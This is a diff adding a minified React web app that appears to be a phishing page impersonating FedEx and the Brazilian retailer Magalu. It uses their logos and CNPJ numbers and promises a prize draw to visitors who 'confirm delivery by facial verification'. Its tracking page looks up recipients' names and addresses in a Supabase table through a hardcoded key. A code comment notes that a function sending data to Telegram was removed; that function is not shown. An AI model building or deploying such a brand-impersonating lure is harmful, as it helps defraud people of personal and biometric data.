+                    return t = o ? h : c ? f : r.route.Component ? a.createElement(r.route.Component, null) : r.route.element ? r.route.element : e, a.createElement(le, {
+                        match: r,
+                        routeContext: {
+                            outlet: e,
+                            matches: m,
+                            isDataRoute: null != n
+                        },
+                        children: t
+                    })
+                };
+            return n && (r.route.ErrorBoundary || r.route.errorElement || 0 === s) ? a.createElement(ie, {
+                location: n.location,
+                revalidation: n.revalidation,
+                component: h,
+                error: o,
+                children: g(),
+                routeContext: {
+                    outlet: null,
+                    matches: m,
+                    isDataRoute: !0
+                }
+            }) : g()
+        }, null)
+    }
+    var ue = function(e) {
+            return e.UseBlocker = "useBlocker", e.UseRevalidator = "useRevalidator", e.UseNavigateStable = "useNavigate", e
+        }(ue || {}),
+        de = function(e) {
+            return e.UseBlocker = "useBlocker", e.UseLoaderData = "useLoaderData", e.UseActionData = "useActionData", e.UseRouteError = "useRouteError", e.UseNavigation = "useNavigation", e.UseRouteLoaderData = "useRouteLoaderData", e.UseMatches = "useMatches", e.UseRevalidator = "useRevalidator", e.UseNavigateStable = "useNavigate", e.UseRouteId = "useRouteId", e
+        }(de || {});
+
+    function he(e) {
+        let t = a.useContext(J);
+        return t || c(!1), t
+    }
+
+    function fe(e) {
+        let t = a.useContext($);
+        return t || c(!1), t
+    }
+
+    function pe(e) {
+        let t = function() {
+            let e = a.useContext(X);
+            return e || c(!1), e
+        }(), n = t.matches[t.matches.length - 1];
+        return n.route.id || c(!1), n.route.id
+    }
+    const me = {};
+
+    function ge(e, t) {
+        null == e || e.v7_startTransition, void 0 === (null == e ? void 0 : e.v7_relativeSplatPath) && (!t || t.v7_relativeSplatPath), t && (t.v7_fetcherPersist, t.v7_normalizeFormMethod, t.v7_partialHydration, t.v7_skipActionErrorRevalidation)
+    }
+    s.startTransition;
+
+    function ve(e) {
+        c(!1)
+    }
+
+    function ye(e) {
+        let {
+                basename: t = "/",
+                children: n = null,
+                location: s,
+                navigationType: o = r.Pop,
+                navigator: i,
+                static: l = !1,
+                future: u
+            } = e;
+        ee() && c(!1);
+        let d = t.replace(/^\/*/, "/"),
+            h = a.useMemo(() => ({
+                basename: d,
+                navigator: i,
+                static: l,
+                future: G({
+                    v7_relativeSplatPath: !1
+                }, u)
+            }), [d, u, i, l]);
+        "string" === typeof s && (s = p(s));
+        let {
+                pathname: f = "/",
+                search: m = "",
+                hash: g = "",
+                state: v = null,
+                key: y = "default"
+            } = s,
+            b = a.useMemo(() => {
+                let e = O(f, d);
+                return null == e ? null : {
+                    location: {
+                        pathname: e,
+                        search: m,
+                        hash: g,
+                        state: v,
+                        key: y
+                    },
+                    navigationType: o
+                }
+            }, [d, f, m, g, v, y, o]);
+        return null == b ? null : a.createElement(Q.Provider, {
+            value: h
+        }, a.createElement(Y.Provider, {
+            children: n,
+            value: b
+        }))
+    }
+
+    function be(e) {
+        let {
+            children: t,
+            location: n
+        } = e;
+        return ae(we(t), n)
+    }
+    new Promise(() => {});
+    a.Component;
+
+    function we(e, t) {
+        void 0 === t && (t = []);
+        let n = [];
+        return a.Children.forEach(e, (e, r) => {
+            if (!a.isValidElement(e)) return;
+            let s = [...t, r];
+            if (e.type === a.Fragment) return void n.push.apply(n, we(e.props.children, s));
+            e.type !== ve && c(!1), e.props.index && e.props.children && c(!1);
+            let o = {
+                id: e.props.id || s.join("-"),
+                caseSensitive: e.props.caseSensitive,
+                element: e.props.element,
+                Component: e.props.Component,
+                index: e.props.index,
+                path: e.props.path,
+                loader: e.props.loader,
+                action: e.props.action,
+                errorElement: e.props.errorElement,
+                ErrorBoundary: e.props.ErrorBoundary,
+                hasErrorBoundary: null != e.props.ErrorBoundary || null != e.props.errorElement,
+                shouldRevalidate: e.props.shouldRevalidate,
+                handle: e.props.handle,
+                lazy: e.props.lazy
+            };
+            e.props.children && (o.children = we(e.props.children, s)), n.push(o)
+        }), n
+    }
+    var _e = n(950),
+        ke = n.t(_e, 2);
+    new Set(["application/x-www-form-urlencoded", "multipart/form-data", "text/plain"]);
+    try {
+        window.__reactRouterVersion = "6"
+    } catch (Oa) {}
+    new Map;
+    const xe = s.startTransition;
+    ke.flushSync, s.useId;
+
+    function Se(e) {
+        let {
+                basename: t,
+                children: n,
+                future: r,
+                window: s
+            } = e,
+            o = a.useRef();
+        var i;
+        null == o.current && (o.current = (void 0 === (i = {
+            window: s,
+            v5Compat: !0
+        }) && (i = {}), m((function(e, t) {
+            let {
+                pathname: n,
+                search: r,
+                hash: a
+            } = e.location;
+            return h("", {
+                pathname: n,
+                search: r,
+                hash: a
+            }, t.state && t.state.usr || null, t.state && t.state.key || "default")
+        }), (function(e, t) {
+            return "string" === typeof t ? t : f(t)
+        }), null, i)));
+        let l = o.current,
+            [c, u] = a.useState({
+                action: l.action,
+                location: l.location
+            }),
+            {
+                v7_startTransition: d
+            } = r || {},
+            p = a.useCallback(e => {
+                d && xe ? xe(() => u(e)) : u(e)
+            }, [u, d]);
+        return a.useLayoutEffect(() => l.listen(p), [l, p]), a.useEffect(() => ge(r), [r]), a.createElement(ye, {
+            basename: t,
+            children: n,
+            location: c.location,
+            navigationType: c.action,
+            navigator: l,
+            future: r
+        })
+    }
+    "undefined" !== typeof window && "undefined" !== typeof window.document && window.document.createElement;
+    var Ee, je;
+    ! function(e) {
+        e.UseScrollRestoration = "useScrollRestoration", e.UseSubmit = "useSubmit", e.UseSubmitFetcher = "useSubmitFetcher", e.UseFetcher = "useFetcher", e.useViewTransitionState = "useViewTransitionState"
+    }(Ee || (Ee = {})), function(e) {
+        e.UseFetcher = "useFetcher", e.UseFetchers = "useFetchers", e.UseScrollRestoration = "useScrollRestoration"
+    }(je || (je = {}));
+    var Te = n(579);
+    const Ce = () => {
+        const e = re(),
+            [t, n] = (0, a.useState)("");
+        (0, a.useEffect)(() => {
+            document.title = "FedEx - Parceria Magalu | Rastreamento de Entregas"
+        }, []);
+        return (0, Te.jsxs)("div", {
+            className: "home-container",
+            children: [(0, Te.jsx)("header", {
+                className: "home-header",
+                children: (0, Te.jsxs)("div", {
+                    className: "header-content",
+                    children: [(0, Te.jsxs)("div", {
+                        className: "header-logo",
+                        children: [(0, Te.jsx)("div", {
+                            className: "header-logo-wrapper",
+                            children: (0, Te.jsx)("img", {
+                                src: "/logo-magalu-azul (1).png",
+                                alt: "Magalu",
+                                className: "header-logo-magalu"
+                            })
+                        }), (0, Te.jsx)("div", {
+                            className: "header-logo-wrapper",
+                            children: (0, Te.jsx)("img", {
+                                src: "/fedex.png",
+                                alt: "FedEx",
+                                className: "header-logo-fedex"
+                            })
+                        })]
+                    }), (0, Te.jsxs)("nav", {
+                        className: "header-nav",
+                        children: [(0, Te.jsx)("a", {
+                            href: "#servicos",
+                            className: "nav-link",
+                            children: "Serviços"
+                        }), (0, Te.jsx)("a", {
+                            href: "#rastreamento",
+                            className: "nav-link",
+                            children: "Rastreamento"
+                        }), (0, Te.jsx)("a", {
+                            href: "#suporte",
+                            className: "nav-link",
+                            children: "Suporte"
+                        })]
+                    })]
+                })
+            }), (0, Te.jsx)("section", {
+                className: "hero-section",
+                children: (0, Te.jsxs)("div", {
+                    className: "hero-content",
+                    children: [(0, Te.jsxs)("div", {
+                        className: "hero-text",
+                        children: [(0, Te.jsxs)("h1", {
+                            className: "hero-title",
+                            children: ["Parceria ", (0, Te.jsx)("span", {
+                                className: "highlight-magalu",
+                                children: "Magalu"
+                            }), " e ", (0, Te.jsx)("span", {
+                                className: "highlight-fedex",
+                                children: "FedEx"
+                            })]
+                        }), (0, Te.jsxs)("p", {
+                            className: "hero-subtitle",
+                            children: [(0, Te.jsx)("strong", {
+                                children: "Programa de Bonificação Magalu!"
+                            }), " Confirme sua entrega e participe do sorteio de prêmios incríveis. Entregas rápidas, seguras e confiáveis em todo o Brasil através da parceria entre Magalu e FedEx."]
+                        }), (0, Te.jsxs)("div", {
+                            className: "bonus-badge",
+                            children: [(0, Te.jsx)("svg", {
+                                width: "24",
+                                height: "24",
+                                viewBox: "0 0 24 24",
+                                fill: "none",
+                                stroke: "currentColor",
+                                strokeWidth: "2",
+                                strokeLinecap: "round",
+                                strokeLinejoin: "round",
+                                children: (0, Te.jsx)("path", {
+                                    d: "M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z"
+                                })
+                            }), (0, Te.jsx)("span", {
+                                children: "Confirme sua entrega e concorra a prêmios exclusivos!"
+                            })]
+                        }), (0, Te.jsxs)("div", {
+                            className: "tracking-search-box",
+                            id: "rastreamento",
+                            children: [(0, Te.jsx)("h2", {
+                                className: "search-title",
+                                children: "Rastreie seu pedido"
+                            }), (0, Te.jsx)("p", {
+                                className: "search-subtitle",
+                                children: "Digite o código de rastreamento fornecido para acompanhar sua entrega em tempo real"
+                            }), (0, Te.jsxs)("form", {
+                                onSubmit: n => {
+                                    n.preventDefault();
+                                    const r = t.trim().toUpperCase();
+                                    r && e("/rastreamento/".concat(r))
+                                },
+                                className: "search-form",
+                                children: [(0, Te.jsx)("input", {
+                                    type: "text",
+                                    placeholder: "Digite o código de rastreamento (ex: PQ1234567890BR)",
+                                    value: t,
+                                    onChange: e => n(e.target.value.toUpperCase()),
+                                    className: "search-input",
+                                    maxLength: "14"
+                                }), (0, Te.jsxs)("button", {
+                                    type: "submit",
+                                    className: "search-button",
+                                    children: [(0, Te.jsxs)("svg", {
+                                        width: "20",
+                                        height: "20",
+                                        viewBox: "0 0 24 24",
+                                        fill: "none",
+                                        stroke: "currentColor",
+                                        strokeWidth: "2.5",
+                                        strokeLinecap: "round",
+                                        strokeLinejoin: "round",
+                                        children: [(0, Te.jsx)("circle", {
+                                            cx: "11",
+                                            cy: "11",
+                                            r: "8"
+                                        }), (0, Te.jsx)("path", {
+                                            d: "m21 21-4.35-4.35"
+                                        })]
+                                    }), "Rastrear"]
+                                })]
+                            })]
+                        })]
+                    }), (0, Te.jsx)("div", {
+                        className: "hero-image",
+                        children: (0, Te.jsx)("img", {
+                            src: "/bannerfedex.png",
+                            alt: "Parceria Magalu e FedEx",
+                            className: "hero-banner"
+                        })
+                    })]
+                })
+            }), (0, Te.jsx)("section", {
+                className: "info-banner",
+                children: (0, Te.jsxs)("div", {
+                    className: "info-content",
+                    children: [(0, Te.jsx)("div", {
+                        className: "info-icon",
+                        children: (0, Te.jsxs)("svg", {
+                            width: "48",
+                            height: "48",
+                            viewBox: "0 0 24 24",
+                            fill: "none",
+                            stroke: "currentColor",
+                            strokeWidth: "2",
+                            strokeLinecap: "round",
+                            strokeLinejoin: "round",
+                            children: [(0, Te.jsx)("circle", {
+                                cx: "12",
+                                cy: "12",
+                                r: "10"
+                            }), (0, Te.jsx)("line", {
+                                x1: "12",
+                                y1: "16",
+                                x2: "12",
+                                y2: "12"
+                            }), (0, Te.jsx)("line", {
+                                x1: "12",
+                                y1: "8",
+                                x2: "12.01",
+                                y2: "8"
+                            })]
+                        })
+                    }), (0, Te.jsxs)("div", {
+                        className: "info-text",
+                        children: [(0, Te.jsx)("h3", {
+                            className: "info-title",
+                            children: "Programa de Bonificação Magalu"
+                        }), (0, Te.jsx)("p", {
+                            className: "info-description",
+                            children: "Ao confirmar sua entrega através da verificação facial, você automaticamente participa do programa de bonificação da Magalu. Concorra a prêmios exclusivos, descontos especiais e benefícios únicos. Quanto mais entregas você confirmar, maiores são suas chances de ganhar prêmios incríveis!"
+                        })]
+                    })]
+                })
+            }), (0, Te.jsx)("section", {
+                className: "services-section",
+                id: "servicos",
+                children: (0, Te.jsxs)("div", {
+                    className: "services-container",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "section-title",
+                        children: "Gerencie suas remessas"
+                    }), (0, Te.jsxs)("div", {
+                        className: "services-grid",
+                        children: [(0, Te.jsxs)("div", {
+                            className: "service-card",
+                            children: [(0, Te.jsx)("div", {
+                                className: "service-icon",
+                                children: (0, Te.jsxs)("svg", {
+                                    width: "48",
+                                    height: "48",
+                                    viewBox: "0 0 24 24",
+                                    fill: "none",
+                                    stroke: "#4D148C",
+                                    strokeWidth: "2",
+                                    strokeLinecap: "round",
+                                    strokeLinejoin: "round",
+                                    children: [(0, Te.jsx)("path", {
+                                        d: "M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"
+                                    }), (0, Te.jsx)("circle", {
+                                        cx: "12",
+                                        cy: "7",
+                                        r: "4"
+                                    })]
+                                })
+                            }), (0, Te.jsx)("h3", {
+                                className: "service-title",
+                                children: "ABRA UMA CONTA"
+                            }), (0, Te.jsx)("p", {
+                                className: "service-description",
+                                children: "Crie sua conta e tenha acesso a todos os serviços"
+                            })]
+                        }), (0, Te.jsxs)("div", {
+                            className: "service-card",
+                            children: [(0, Te.jsx)("div", {
+                                className: "service-icon",
+                                children: (0, Te.jsxs)("svg", {
+                                    width: "48",
+                                    height: "48",
+                                    viewBox: "0 0 24 24",
+                                    fill: "none",
+                                    stroke: "#4D148C",
+                                    strokeWidth: "2",
+                                    strokeLinecap: "round",
+                                    strokeLinejoin: "round",
+                                    children: [(0, Te.jsx)("path", {
+                                        d: "M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"
+                                    }), (0, Te.jsx)("line", {
+                                        x1: "12",
+                                        y1: "9",
+                                        x2: "12",
+                                        y2: "13"
+                                    }), (0, Te.jsx)("line", {
+                                        x1: "12",
+                                        y1: "17",
+                                        x2: "12.01",
+                                        y2: "17"
+                                    })]
+                                })
+                            }), (0, Te.jsx)("h3", {
+                                className: "service-title",
+                                children: "ALERTAS DE SERVIÇO"
+                            }), (0, Te.jsx)("p", {
+                                className: "service-description",
+                                children: "Receba notificações sobre o status das suas entregas"
+                            })]
+                        }), (0, Te.jsxs)("div", {
+                            className: "service-card",
+                            children: [(0, Te.jsx)("div", {
+                                className: "service-icon",
+                                children: (0, Te.jsxs)("svg", {
+                                    width: "48",
+                                    height: "48",
+                                    viewBox: "0 0 24 24",
+                                    fill: "none",
+                                    stroke: "#4D148C",
+                                    strokeWidth: "2",
+                                    strokeLinecap: "round",
+                                    strokeLinejoin: "round",
+                                    children: [(0, Te.jsx)("circle", {
+                                        cx: "12",
+                                        cy: "12",
+                                        r: "3"
+                                    }), (0, Te.jsx)("path", {
+                                        d: "M12 1v6m0 6v6M5.64 5.64l4.24 4.24m4.24 4.24l4.24 4.24M1 12h6m6 0h6M5.64 18.36l4.24-4.24m4.24-4.24l4.24-4.24"
+                                    })]
+                                })
+                            }), (0, Te.jsx)("h3", {
+                                className: "service-title",
+                                children: "FERRAMENTAS ON-LINE"
+                            }), (0, Te.jsx)("p", {
+                                className: "service-description",
+                                children: "Acesse ferramentas exclusivas para gerenciar seus envios"
+                            })]
+                        }), (0, Te.jsxs)("div", {
+                            className: "service-card",
+                            children: [(0, Te.jsx)("div", {
+                                className: "service-icon",
+                                children: (0, Te.jsxs)("svg", {
+                                    width: "48",
+                                    height: "48",
+                                    viewBox: "0 0 24 24",
+                                    fill: "none",
+                                    stroke: "#4D148C",
+                                    strokeWidth: "2",
+                                    strokeLinecap: "round",
+                                    strokeLinejoin: "round",
+                                    children: [(0, Te.jsx)("path", {
+                                        d: "M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"
+                                    }), (0, Te.jsx)("circle", {
+                                        cx: "12",
+                                        cy: "10",
+                                        r: "3"
+                                    })]
+                                })
+                            }), (0, Te.jsx)("h3", {
+                                className: "service-title",
+                                children: "HORÁRIO DE ATENDIMENTO"
+                            }), (0, Te.jsx)("p", {
+                                className: "service-description",
+                                children: "Encontre lojas e horários de atendimento próximos a você"
+                            })]
+                        }), (0, Te.jsxs)("div", {
+                            className: "service-card",
+                            children: [(0, Te.jsx)("div", {
+                                className: "service-icon",
+                                children: (0, Te.jsxs)("svg", {
+                                    width: "48",
+                                    height: "48",
+                                    viewBox: "0 0 24 24",
+                                    fill: "none",
+                                    stroke: "#4D148C",
+                                    strokeWidth: "2",
+                                    strokeLinecap: "round",
+                                    strokeLinejoin: "round",
+                                    children: [(0, Te.jsx)("path", {
+                                        d: "M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"
+                                    }), (0, Te.jsx)("polyline", {
+                                        points: "14 2 14 8 20 8"
+                                    }), (0, Te.jsx)("line", {
+                                        x1: "16",
+                                        y1: "13",
+                                        x2: "8",
+                                        y2: "13"
+                                    }), (0, Te.jsx)("line", {
+                                        x1: "16",
+                                        y1: "17",
+                                        x2: "8",
+                                        y2: "17"
+                                    }), (0, Te.jsx)("polyline", {
+                                        points: "10 9 9 9 8 9"
+                                    })]
+                                })
+                            }), (0, Te.jsx)("h3", {
+                                className: "service-title",
+                                children: "FEDEX BILLING ONLINE"
+                            }), (0, Te.jsx)("p", {
+                                className: "service-description",
+                                children: "Gerencie suas faturas e pagamentos online"
+                            })]
+                        })]
+                    })]
+                })
+            }), (0, Te.jsx)("section", {
+                className: "magalu-banner-section",
+                children: (0, Te.jsxs)("div", {
+                    className: "magalu-banner-container",
+                    children: [(0, Te.jsx)("div", {
+                        className: "magalu-banner-image",
+                        children: (0, Te.jsx)("img", {
+                            src: "/BANNERMAGALU.png",
+                            alt: "Programa de Bonificação Magalu",
+                            className: "magalu-banner-img"
+                        })
+                    }), (0, Te.jsxs)("div", {
+                        className: "magalu-banner-content",
+                        children: [(0, Te.jsx)("h2", {
+                            className: "magalu-banner-title",
+                            children: "Programa de Bonificação Magalu"
+                        }), (0, Te.jsx)("p", {
+                            className: "magalu-banner-subtitle",
+                            children: "Confirme suas entregas e transforme cada entrega em uma chance de ganhar!"
+                        }), (0, Te.jsxs)("div", {
+                            className: "magalu-benefits",
+                            children: [(0, Te.jsxs)("div", {
+                                className: "magalu-benefit-item",
+                                children: [(0, Te.jsx)("svg", {
+                                    width: "24",
+                                    height: "24",
+                                    viewBox: "0 0 24 24",
+                                    fill: "none",
+                                    stroke: "#0066CC",
+                                    strokeWidth: "2.5",
+                                    strokeLinecap: "round",
+                                    strokeLinejoin: "round",
+                                    children: (0, Te.jsx)("polyline", {
+                                        points: "20 6 9 17 4 12"
+                                    })
+                                }), (0, Te.jsx)("span", {
+                                    children: "Participação automática ao confirmar entrega"
+                                })]
+                            }), (0, Te.jsxs)("div", {
+                                className: "magalu-benefit-item",
+                                children: [(0, Te.jsx)("svg", {
+                                    width: "24",
+                                    height: "24",
+                                    viewBox: "0 0 24 24",
+                                    fill: "none",
+                                    stroke: "#0066CC",
+                                    strokeWidth: "2.5",
+                                    strokeLinecap: "round",
+                                    strokeLinejoin: "round",
+                                    children: (0, Te.jsx)("polyline", {
+                                        points: "20 6 9 17 4 12"
+                                    })
+                                }), (0, Te.jsx)("span", {
+                                    children: "Prêmios exclusivos: smartphones, tablets e vale-compras"
+                                })]
+                            }), (0, Te.jsxs)("div", {
+                                className: "magalu-benefit-item",
+                                children: [(0, Te.jsx)("svg", {
+                                    width: "24",
+                                    height: "24",
+                                    viewBox: "0 0 24 24",
+                                    fill: "none",
+                                    stroke: "#0066CC",
+                                    strokeWidth: "2.5",
+                                    strokeLinecap: "round",
+                                    strokeLinejoin: "round",
+                                    children: (0, Te.jsx)("polyline", {
+                                        points: "20 6 9 17 4 12"
+                                    })
+                                }), (0, Te.jsx)("span", {
+                                    children: "Quanto mais você confirma, maiores suas chances"
+                                })]
+                            }), (0, Te.jsxs)("div", {
+                                className: "magalu-benefit-item",
+                                children: [(0, Te.jsx)("svg", {
+                                    width: "24",
+                                    height: "24",
+                                    viewBox: "0 0 24 24",
+                                    fill: "none",
+                                    stroke: "#0066CC",
+                                    strokeWidth: "2.5",
+                                    strokeLinecap: "round",
+                                    strokeLinejoin: "round",
+                                    children: (0, Te.jsx)("polyline", {
+                                        points: "20 6 9 17 4 12"
+                                    })
+                                }), (0, Te.jsx)("span", {
+                                    children: "Sem custo adicional - totalmente gratuito"
+                                })]
+                            })]
+                        }), (0, Te.jsxs)("p", {
+                            className: "magalu-banner-cta",
+                            children: [(0, Te.jsx)("strong", {
+                                children: "Não perca essa oportunidade!"
+                            }), " Cada entrega confirmada é uma nova chance de ganhar prêmios incríveis."]
+                        })]
+                    })]
+                })
+            }), (0, Te.jsx)("section", {
+                className: "partnership-section",
+                children: (0, Te.jsxs)("div", {
+                    className: "partnership-content",
+                    children: [(0, Te.jsxs)("div", {
+                        className: "partnership-text",
+                        children: [(0, Te.jsx)("h2", {
+                            className: "partnership-title",
+                            children: "Ganhe prêmios confirmando suas entregas!"
+                        }), (0, Te.jsx)("p", {
+                            className: "partnership-intro",
+                            children: "A parceria Magalu e FedEx oferece muito mais que entregas rápidas. Ao confirmar sua entrega através da verificação facial, você participa automaticamente do programa de bonificação e concorre a prêmios exclusivos, incluindo smartphones, tablets, vale-compras e muito mais!"
+                        }), (0, Te.jsxs)("div", {
+                            className: "partnership-features",
+                            children: [(0, Te.jsxs)("div", {
+                                className: "feature-item",
+                                children: [(0, Te.jsx)("svg", {
+                                    width: "24",
+                                    height: "24",
+                                    viewBox: "0 0 24 24",
+                                    fill: "none",
+                                    stroke: "#0066CC",
+                                    strokeWidth: "2.5",
+                                    strokeLinecap: "round",
+                                    strokeLinejoin: "round",
+                                    children: (0, Te.jsx)("polyline", {
+                                        points: "20 6 9 17 4 12"
+                                    })
+                                }), (0, Te.jsx)("span", {
+                                    children: "Rastreamento em tempo real"
+                                })]
+                            }), (0, Te.jsxs)("div", {
+                                className: "feature-item",
+                                children: [(0, Te.jsx)("svg", {
+                                    width: "24",
+                                    height: "24",
+                                    viewBox: "0 0 24 24",
+                                    fill: "none",
+                                    stroke: "#0066CC",
+                                    strokeWidth: "2.5",
+                                    strokeLinecap: "round",
+                                    strokeLinejoin: "round",
+                                    children: (0, Te.jsx)("polyline", {
+                                        points: "20 6 9 17 4 12"
+                                    })
+                                }), (0, Te.jsx)("span", {
+                                    children: "Entregas rápidas e seguras"
+                                })]
+                            }), (0, Te.jsxs)("div", {
+                                className: "feature-item",
+                                children: [(0, Te.jsx)("svg", {
+                                    width: "24",
+                                    height: "24",
+                                    viewBox: "0 0 24 24",
+                                    fill: "none",
+                                    stroke: "#0066CC",
+                                    strokeWidth: "2.5",
+                                    strokeLinecap: "round",
+                                    strokeLinejoin: "round",
+                                    children: (0, Te.jsx)("polyline", {
+                                        points: "20 6 9 17 4 12"
+                                    })
+                                }), (0, Te.jsx)("span", {
+                                    children: "Cobertura em todo o Brasil"
+                                })]
+                            }), (0, Te.jsxs)("div", {
+                                className: "feature-item",
+                                children: [(0, Te.jsx)("svg", {
+                                    width: "24",
+                                    height: "24",
+                                    viewBox: "0 0 24 24",
+                                    fill: "none",
+                                    stroke: "#0066CC",
+                                    strokeWidth: "2.5",
+                                    strokeLinecap: "round",
+                                    strokeLinejoin: "round",
+                                    children: (0, Te.jsx)("polyline", {
+                                        points: "20 6 9 17 4 12"
+                                    })
+                                }), (0, Te.jsx)("span", {
+                                    children: "Suporte 24/7"
+                                })]
+                            })]
+                        })]
+                    }), (0, Te.jsx)("div", {
+                        className: "partnership-image",
+                        children: (0, Te.jsx)("img", {
+                            src: "/bannerfedex2.png",
+                            alt: "Parceria Magalu e FedEx",
+                            className: "partnership-banner"
+                        })
+                    })]
+                })
+            }), (0, Te.jsx)("section", {
+                className: "cta-section",
+                children: (0, Te.jsxs)("div", {
+                    className: "cta-content",
+                    children: [(0, Te.jsx)("h2", {
+                        className: "cta-title",
+                        children: "Confirme sua entrega e concorra a prêmios!"
+                    }), (0, Te.jsx)("p", {
+                        className: "cta-subtitle",
+                        children: "Participe do programa de bonificação Magalu. Quanto mais entregas você confirmar, maiores são suas chances de ganhar!"
+                    })]
+                })
+            }), (0, Te.jsx)("footer", {
+                className: "home-footer",
+                children: (0, Te.jsxs)("div", {
+                    className: "footer-content",
+                    children: [(0, Te.jsxs)("div", {
+                        className: "footer-logos",
+                        children: [(0, Te.jsx)("img", {
+                            src: "/logo-magalu-azul (1).png",
+                            alt: "Magalu",
+                            className: "footer-logo"
+                        }), (0, Te.jsx)("img", {
+                            src: "/fedex.png",
+                            alt: "FedEx",
+                            className: "footer-logo"
+                        })]
+                    }), (0, Te.jsxs)("div", {
+                        className: "footer-links",
+                        children: [(0, Te.jsx)("a", {
+                            href: "#servicos",
+                            className: "footer-link",
+                            children: "Serviços"
+                        }), (0, Te.jsx)("a", {
+                            href: "#rastreamento",
+                            className: "footer-link",
+                            children: "Rastreamento"
+                        }), (0, Te.jsx)("a", {
+                            href: "#suporte",
+                            className: "footer-link",
+                            children: "Suporte"
+                        }), (0, Te.jsx)("a", {
+                            href: "/termos",
+                            className: "footer-link",
+                            children: "Termos e Condições"
+                        }), (0, Te.jsx)("a", {
+                            href: "https://www.fedex.com/pt-br/home.html",
+                            target: "_blank",
+                            rel: "noopener noreferrer",
+                            className: "footer-link",
+                            children: "Site FedEx"
+                        })]
+                    }), (0, Te.jsxs)("div", {
+                        className: "footer-social",
+                        children: [(0, Te.jsxs)("a", {
+                            href: "https://www.instagram.com/magalu/",
+                            target: "_blank",
+                            rel: "noopener noreferrer",
+                            className: "social-link",
+                            "aria-label": "Instagram Magalu",
+                            children: [(0, Te.jsxs)("svg", {
+                                width: "24",
+                                height: "24",
+                                viewBox: "0 0 24 24",
+                                fill: "none",
+                                stroke: "currentColor",
+                                strokeWidth: "2",
+                                strokeLinecap: "round",
+                                strokeLinejoin: "round",
+                                children: [(0, Te.jsx)("rect", {
+                                    x: "2",
+                                    y: "2",
+                                    width: "20",
+                                    height: "20",
+                                    rx: "5",
+                                    ry: "5"
+                                }), (0, Te.jsx)("path", {
+                                    d: "M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"
+                                }), (0, Te.jsx)("line", {
+                                    x1: "17.5",
+                                    y1: "6.5",
+                                    x2: "17.51",
+                                    y2: "6.5"
+                                })]
+                            }), (0, Te.jsx)("span", {
+                                children: "Magalu"
+                            })]
+                        }), (0, Te.jsxs)("a", {
+                            href: "https://www.instagram.com/fedex/",
+                            target: "_blank",
+                            rel: "noopener noreferrer",
+                            className: "social-link",
+                            "aria-label": "Instagram FedEx",
+                            children: [(0, Te.jsxs)("svg", {
+                                width: "24",
+                                height: "24",
+                                viewBox: "0 0 24 24",
+                                fill: "none",
+                                stroke: "currentColor",
+                                strokeWidth: "2",
+                                strokeLinecap: "round",
+                                strokeLinejoin: "round",
+                                children: [(0, Te.jsx)("rect", {
+                                    x: "2",
+                                    y: "2",
+                                    width: "20",
+                                    height: "20",
+                                    rx: "5",
+                                    ry: "5"
+                                }), (0, Te.jsx)("path", {
+                                    d: "M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"
+                                }), (0, Te.jsx)("line", {
+                                    x1: "17.5",
+                                    y1: "6.5",
+                                    x2: "17.51",
+                                    y2: "6.5"
+                                })]
+                            }), (0, Te.jsx)("span", {
+                                children: "FedEx"
+                            })]
+                        })]
+                    }), (0, Te.jsxs)("div", {
+                        className: "footer-cnpj",
+                        children: [(0, Te.jsxs)("div", {
+                            className: "cnpj-item",
+                            children: [(0, Te.jsx)("strong", {
+                                children: "Magalu:"
+                            }), " CNPJ 47.960.950/0001-21"]
+                        }), (0, Te.jsxs)("div", {
+                            className: "cnpj-item",
+                            children: [(0, Te.jsx)("strong", {
+                                children: "FedEx:"
+                            }), " CNPJ 10.970.887/0001-02"]
+                        })]
+                    }), (0, Te.jsx)("p", {
+                        className: "footer-copyright",
+                        children: "© 2025 Parceria Magalu e FedEx. Todos os direitos reservados."
+                    })]
+                })
+            })]
+        })
+    };
+
+    // REMOVIDA A FUNÇÃO DE ENVIO PARA TELEGRAM (linhas ~1900-2100)
+
+    const ja = ((e, t, n) => new Ea(e, t, n))(
+        "https://opiwznepfjcinxrymrwx.supabase.co",
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9waXd6bmVwZmpjaW54cnltcnh3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI4OTQ3MDQsImV4cCI6MjA4ODQ3MDcwNH0.bcfSAqQzPNs1BISoKBUP2p1KU0MIgCzFimX4OzhU0yU"
+    );
+
+    const Ta = () => {
+        const {
+            trackingCode: e
+        } = function() {
+            let {
+                matches: e
+            } = a.useContext(X), t = e[e.length - 1];
+            return t ? t.params : {}
+        }(), t = re(), [n, r] = (0, a.useState)(null), [s, o] = (0, a.useState)(!1);
+        if ((0, a.useEffect)(() => {
+                document.title = "FedEx - Rastreamento de Pedido"
+            }, []), (0, a.useEffect)(() => {
+                (async () => {
+                    const t = e.toUpperCase();
+                    console.log("Carregando dados do rastreamento:", t);
+                    try {
+                        const {
+                            data: e,
+                            error: n
+                        } = await ja.from("trackings_test").select("*").eq("code", t).maybeSingle();
+                        if (console.log("Resultado da busca no Supabase:", {
+                                data: e,
+                                error: n
+                            }), e && e.code) {
+                            console.log("Dados encontrados no Supabase!");
+                            const t = {
+                                trackingCode: e.code || e.trackingCode,
+                                recipientName: e.recipient_name || e.recipientName,
+                                address: e.address,
+                                lastUpdate: e.last_update || e.lastUpdate,
+                                timeline: e.timeline || [],
+                                status: e.status || "postado"
+                            };
+                            return void r(t)
+                        }
+                        console.log("Código não encontrado - redirecionando...");
+                        // Não cria dados falsos, apenas mostra erro
+                        r({
+                            error: true,
+                            message: "Código não encontrado",
+                            trackingCode: t
+                        })
+                    } catch (n) {
+                        console.error("Erro ao carregar dados:", n);
+                        r({
+                            error: true,
+                            message: "Erro ao carregar",
+                            trackingCode: t
+                        })
+                    }
+                })()
+            }, [e, t]), !n) return (0, Te.jsx)("div", {
+            className: "tracking-container",
